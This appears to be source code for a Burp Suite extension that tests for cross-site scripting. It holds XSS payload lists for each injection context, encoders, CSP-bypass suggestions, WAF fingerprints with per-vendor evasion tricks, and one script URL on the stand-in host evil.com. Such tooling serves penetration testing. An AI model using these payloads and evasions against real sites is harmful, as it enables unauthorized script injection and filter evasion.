# -*- coding: utf-8 -*-
import os
import re

# Try to import Java classes, but handle gracefully if not in Jython
try:
    from java.net import URL

    JAVA_AVAILABLE = True
except ImportError:
    JAVA_AVAILABLE = False

    # Define a dummy URL class for testing outside Burp
    class URL:
        def __init__(self, url_string):
            self.url_string = url_string


class PayloadManager:
    def __init__(self, base_path):
        self.base_path = base_path
        self.payloads = {"basic": [], "csp_bypass": [], "waf_bypass": [], "custom": []}
        self.load_payloads()

    def load_payloads(self):
        """Load payloads from files"""
        try:
            # Load basic XSS payloads
            basic_file = os.path.join(self.base_path, "payloads", "xss_payloads.txt")
            self.payloads["basic"] = self._load_payload_file(basic_file)

            # Load CSP bypass payloads
            csp_file = os.path.join(self.base_path, "csp", "payload.txt")
            self.payloads["csp_bypass"] = self._load_payload_file(csp_file)

            # Load WAF bypass payloads
            waf_file = os.path.join(self.base_path, "payloads", "waf_bypass.txt")
            self.payloads["waf_bypass"] = self._load_payload_file(waf_file)

        except Exception as e:
            print("Error loading payloads: " + str(e))

    def _load_payload_file(self, filepath):
        """Load payloads from a single file"""
        payloads = []
        try:
            with open(filepath, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        payloads.append(line)
        except Exception as e:
            print("Error loading payload file {}: {}".format(filepath, str(e)))
        return payloads

    def get_payloads(self, payload_type="basic"):
        """Get payloads by type"""
        return self.payloads.get(payload_type, [])

    def add_custom_payload(self, payload):
        """Add a custom payload"""
        if payload not in self.payloads["custom"]:
            self.payloads["custom"].append(payload)

    def remove_custom_payload(self, payload):
        """Remove a custom payload"""
        if payload in self.payloads["custom"]:
            self.payloads["custom"].remove(payload)

    def get_context_payloads(self, context):
        """Get payloads based on injection context"""
        context_payloads = []

        if context == "html":
            context_payloads.extend(
                [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                ]
            )
        elif context == "attribute":
            context_payloads.extend(
                [
                    '" onmouseover="alert(\'XSS\')" "',
                    "' onmouseover='alert(\"XSS\")' '",
                    'javascript:alert("XSS")',
                    '" autofocus onfocus="alert(\'XSS\')" "',
                ]
            )
        elif context == "script":
            context_payloads.extend(
                [
                    'alert("XSS")',
                    '</script><script>alert("XSS")</script>',
                    '\';alert("XSS");//',
                    '";alert("XSS");//',
                ]
            )
        elif context == "url":
            context_payloads.extend(
                [
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                    "http://evil.com/xss.js",
                ]
            )

        return context_payloads

    def encode_payload(self, payload, encoding_type):
        """Encode payload for WAF bypass"""
        if encoding_type == "url":
            return self._url_encode(payload)
        elif encoding_type == "html":
            return self._html_encode(payload)
        elif encoding_type == "unicode":
            return self._unicode_encode(payload)
        elif encoding_type == "hex":
            return self._hex_encode(payload)
        elif encoding_type == "double_url":
            return self._url_encode(self._url_encode(payload))
        else:
            return payload

    def _url_encode(self, payload):
        """URL encode the payload"""
        import urllib

        return urllib.quote(payload)

    def _html_encode(self, payload):
        """HTML encode the payload"""
        return (
            payload.replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;")
        )

    def _unicode_encode(self, payload):
        """Unicode encode the payload"""
        encoded = ""
        for char in payload:
            encoded += "\\u{:04x}".format(ord(char))
        return encoded

    def _hex_encode(self, payload):
        """Hex encode the payload"""
        encoded = ""
        for char in payload:
            encoded += "\\x{:02x}".format(ord(char))
        return encoded


class ContextAnalyzer:
    def __init__(self):
        self.html_contexts = {
            "html": r"<[^>]*>([^<]*)",
            "attribute": r'(\w+)\s*=\s*["\']([^"\']*)["\']',
            "script": r"<script[^>]*>([^<]*)</script>",
            "style": r"<style[^>]*>([^<]*)</style>",
            "comment": r"<!--([^>]*)-->",
            "url": r'(href|src|action)\s*=\s*["\']([^"\']*)["\']',
        }

    def analyze_injection_point(self, response_body, payload):
        """Analyze where the payload was injected in the response"""
        contexts = []

        if payload in response_body:
            # Find all occurrences of the payload
            start = 0
            while True:
                index = response_body.find(payload, start)
                if index == -1:
                    break

                # Extract context around the payload
                context_start = max(0, index - 100)
                context_end = min(len(response_body), index + len(payload) + 100)
                context = response_body[context_start:context_end]

                # Determine the injection context
                injection_context = self._determine_context(context, payload)
                if injection_context not in contexts:
                    contexts.append(injection_context)

                start = index + 1

        return contexts

    def _determine_context(self, context, payload):
        """Determine the injection context"""
        # Check if inside HTML tag
        if self._is_in_html_tag(context, payload):
            return "attribute"

        # Check if inside script tag
        if "<script" in context and "</script>" in context:
            return "script"

        # Check if inside style tag
        if "<style" in context and "</style>" in context:
            return "style"

        # Check if inside comment
        if "<!--" in context and "-->" in context:
            return "comment"

        # Check if in URL context
        if self._is_in_url_context(context, payload):
            return "url"

        # Default to HTML context
        return "html"

    def _is_in_html_tag(self, context, payload):
        """Check if payload is inside an HTML tag"""
        payload_index = context.find(payload)
        if payload_index == -1:
            return False

        # Look backwards for opening tag
        before = context[:payload_index]
        after = context[payload_index:]

        last_open = before.rfind("<")
        last_close = before.rfind(">")

        # If last < is after last >, we're inside a tag
        if last_open > last_close:
            # Make sure there's a closing > after the payload
            if ">" in after:
                return True

        return False

    def _is_in_url_context(self, context, payload):
        """Check if payload is in a URL context"""
        url_attributes = ["href", "src", "action", "formaction"]
        payload_index = context.find(payload)

        if payload_index == -1:
            return False

        before = context[:payload_index]

        for attr in url_attributes:
            if attr + "=" in before:
                # Check if we're inside quotes after the attribute
                attr_index = before.rfind(attr + "=")
                after_attr = before[attr_index:]

                quote_count_single = after_attr.count("'")
                quote_count_double = after_attr.count('"')

                # If odd number of quotes, we're inside a quoted value
                if quote_count_single % 2 == 1 or quote_count_double % 2 == 1:
                    return True

        return False


class CSPAnalyzer:
    def __init__(self):
        self.csp_directives = [
            "default-src",
            "script-src",
            "object-src",
            "style-src",
            "img-src",
            "media-src",
            "frame-src",
            "font-src",
            "connect-src",
            "form-action",
            "frame-ancestors",
            "plugin-types",
            "base-uri",
            "child-src",
            "worker-src",
        ]

    def parse_csp(self, csp_header):
        """Parse CSP header into directives"""
        if not csp_header:
            return {}

        directives = {}

        # Split by semicolon and parse each directive
        for directive in csp_header.split(";"):
            directive = directive.strip()
            if not directive:
                continue

            parts = directive.split()
            if len(parts) >= 1:
                directive_name = parts[0].lower()
                sources = parts[1:] if len(parts) > 1 else []
                directives[directive_name] = sources

        return directives

    def analyze_csp_bypasses(self, csp_directives):
        """Analyze CSP for potential bypasses"""
        bypasses = []

        # Check script-src directive
        script_src = csp_directives.get(
            "script-src", csp_directives.get("default-src", [])
        )

        if not script_src:
            bypasses.append(
                {
                    "type": "No CSP",
                    "description": "No Content Security Policy detected",
                    "severity": "High",
                    "bypass_method": "Any XSS payload should work",
                }
            )
        else:
            # Check for unsafe-inline
            if "'unsafe-inline'" in script_src:
                bypasses.append(
                    {
                        "type": "unsafe-inline",
                        "description": "script-src allows unsafe-inline",
                        "severity": "High",
                        "bypass_method": "Use inline script tags: <script>alert(1)</script>",
                    }
                )

            # Check for unsafe-eval
            if "'unsafe-eval'" in script_src:
                bypasses.append(
                    {
                        "type": "unsafe-eval",
                        "description": "script-src allows unsafe-eval",
                        "severity": "High",
                        "bypass_method": 'Use eval(): <script>eval("alert(1)")</script>',
                    }
                )

            # Check for data: URIs
            if "data:" in script_src:
                bypasses.append(
                    {
                        "type": "data-uri",
                        "description": "script-src allows data: URIs",
                        "severity": "High",
                        "bypass_method": 'Use data URI: <script src="data:text/javascript,alert(1)"></script>',
                    }
                )

            # Check for wildcard domains
            for source in script_src:
                if "*" in source and source != "'none'":
                    bypasses.append(
                        {
                            "type": "wildcard",
                            "description": "script-src contains wildcard: " + source,
                            "severity": "Medium",
                            "bypass_method": "Find subdomain or path under: " + source,
                        }
                    )

            # Check for JSONP endpoints
            jsonp_domains = ["googleapis.com", "google.com", "jquery.com", "cdnjs.com"]
            for source in script_src:
                for domain in jsonp_domains:
                    if domain in source:
                        bypasses.append(
                            {
                                "type": "jsonp",
                                "description": "Potential JSONP bypass via: " + domain,
                                "severity": "Medium",
                                "bypass_method": "Use JSONP callback from: " + domain,
                            }
                        )

            # Check for missing object-src
            if "object-src" not in csp_directives:
                bypasses.append(
                    {
                        "type": "missing-object-src",
                        "description": "object-src directive missing",
                        "severity": "Medium",
                        "bypass_method": 'Use object tag: <object data="data:text/html,<script>alert(1)</script>"></object>',
                    }
                )

            # Check for missing base-uri
            if "base-uri" not in csp_directives:
                bypasses.append(
                    {
                        "type": "missing-base-uri",
                        "description": "base-uri directive missing",
                        "severity": "Low",
                        "bypass_method": "Use base tag injection if possible",
                    }
                )

        return bypasses

    def suggest_bypass_payloads(self, csp_directives):
        """Suggest specific payloads based on CSP analysis"""
        payloads = []
        bypasses = self.analyze_csp_bypasses(csp_directives)

        for bypass in bypasses:
            if bypass["type"] == "unsafe-inline":
                payloads.extend(
                    [
                        '<script>alert("CSP Bypass - unsafe-inline")</script>',
                        '<img src=x onerror=alert("CSP Bypass")>',
                        '<svg onload=alert("CSP Bypass")>',
                    ]
                )
            elif bypass["type"] == "unsafe-eval":
                payloads.extend(
                    [
                        "<script>eval(\"alert('CSP Bypass - unsafe-eval')\")</script>",
                        "<script>Function(\"alert('CSP Bypass')\")();</script>",
                        "<script>setTimeout(\"alert('CSP Bypass')\",1)</script>",
                    ]
                )
            elif bypass["type"] == "data-uri":
                payloads.extend(
                    [
                        "<script src=\"data:text/javascript,alert('CSP Bypass - data URI')\"></script>",
                        "<iframe src=\"data:text/html,<script>alert('CSP Bypass')</script>\"></iframe>",
                    ]
                )
            elif bypass["type"] == "missing-object-src":
                payloads.extend(
                    [
                        "<object data=\"data:text/html,<script>alert('CSP Bypass - object')</script>\"></object>",
                        "<embed src=\"data:text/html,<script>alert('CSP Bypass')</script>\">",
                    ]
                )

        return payloads


class WAFDetector:
    def __init__(self):
        self.waf_signatures = {
            "cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cloudflare-nginx"],
            "akamai": ["akamai", "ak-bmsc", "akamai-ghost"],
            "aws_waf": ["awselb", "awsalb", "x-amzn-requestid"],
            "barracuda": ["barracuda", "barra"],
            "f5_bigip": ["bigip", "f5-big-ip", "bigipserver"],
            "imperva": ["imperva", "incap_ses", "visid_incap"],
            "mod_security": ["mod_security", "modsecurity"],
            "naxsi": ["naxsi"],
        }

    def detect_waf(self, headers, response_body):
        """Detect WAF based on headers and response"""
        detected_wafs = []

        # Check headers
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                for header_name, header_value in headers.items():
                    if (
                        signature.lower() in header_name.lower()
                        or signature.lower() in header_value.lower()
                    ):
                        if waf_name not in detected_wafs:
                            detected_wafs.append(waf_name)

        # Check response body for WAF signatures
        response_lower = response_body.lower()
        for waf_name, signatures in self.waf_signatures.items():
            for signature in signatures:
                if signature.lower() in response_lower:
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)

        # Check for generic WAF indicators
        blocked_indicators = [
            "blocked",
            "forbidden",
            "access denied",
            "security",
            "firewall",
            "waf",
            "filtered",
            "malicious",
        ]

        for indicator in blocked_indicators:
            if indicator in response_lower:
                if "generic" not in detected_wafs:
                    detected_wafs.append("generic")
                break

        return detected_wafs

    def get_waf_bypass_techniques(self, waf_type):
        """Get specific bypass techniques for detected WAF"""
        techniques = {
            "cloudflare": [
                "Case variation: <ScRiPt>alert(1)</ScRiPt>",
                "Comment insertion: <script/**/src=data:,alert(1)>",
                "Unicode encoding: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            ],
            "akamai": [
                "Double encoding: %253Cscript%253E",
                "Mixed case: <ScrIpT>alert(1)</ScrIpT>",
                "Alternative tags: <svg onload=alert(1)>",
            ],
            "aws_waf": [
                "Fragment concatenation: <scr<script>ipt>alert(1)</script>",
                "Event handlers: <img src=x onerror=alert(1)>",
                "Data URIs: <iframe src=data:text/html,<script>alert(1)</script>>",
            ],
            "mod_security": [
                "Whitespace variations: <script >alert(1)</script >",
                "Alternative quotes: <script>alert`1`</script>",
                'Function construction: <script>[]["constructor"]["constructor"]("alert(1)")()</script>',
            ],
            "generic": [
                "HTML encoding: &lt;script&gt;alert(1)&lt;/script&gt;",
                "URL encoding: %3Cscript%3Ealert(1)%3C/script%3E",
                "Unicode normalization: <script>alert\\u0028 1\\u0029</script>",
            ],
        }

        return techniques.get(waf_type, techniques["generic"])
